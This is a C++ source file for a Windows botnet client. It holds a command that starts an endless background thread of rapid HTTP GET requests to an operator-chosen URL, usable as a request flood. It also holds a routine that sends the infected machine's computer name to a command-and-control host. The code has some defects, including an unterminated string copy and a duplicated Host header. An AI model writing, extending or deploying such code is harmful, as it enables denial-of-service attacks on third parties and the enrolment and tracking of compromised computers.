#include <iostream>
#include <string>
#include <string.h>
#include <vector>
#include <map>
#include <Windows.h>

#include "commands.h"
#include "http_request.h"
#include "http_client.h"
#include "define.h"
#include "utils.h"

namespace botnet {
    DWORD WINAPI ThreadHttpReq(LPVOID lpParam) {
        for(;;) {
            char *urlc = (char *) lpParam;
            std::string url = urlc;
            std::string path;
            std::string gurl;
            size_t find_bar = url.find("/");

            http_request *http_req = new http_request(botnet::http::GET);
            http_request::headers header;
            if (find_bar != std::string::npos) {
                path = url.substr(find_bar + 1);
                gurl = url.substr(0, find_bar);
                http_req->setPath(path);
                header.add("Host", gurl);
            }
            else {
                gurl = url;
            }

            header.add("Host", gurl);
            http_req->setHeaders(header);

            http_client *http_c = new http_client(gurl, 80, true);
            http_c->request(http_req);
            MessageBox(NULL, http_c->getContent().c_str(), gurl.c_str(), MB_OK);

            delete http_req;
            delete http_c;
            Sleep(10);
        }

        return 0;
    }
    int http_req(std::string url) {
        static bool exec = false;

        HANDLE  hThread;
        DWORD   dwThread;
        char *urlc;

        if (!exec) {
            urlc = new char[url.length() + 1];

            strncpy(urlc, url.c_str(), url.length());

            hThread = CreateThread(NULL, 0, ThreadHttpReq, urlc, 0, &dwThread);

            exec = true;
        }
        return 0;
    }

    int get_pcname(std::string s) {
        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        std::string path = "?compname=" + getComputerName();
        http_req->setPath(path);
        std::string host = HOST + ':' + std::to_string(PORT);
        header.add("Host", host);
        http_req->setHeaders(header);

        http_client *http_c = new http_client(HOST, PORT);
        http_c->request(http_req);
        delete http_req;
        delete http_c;
        return 0;
    }
}
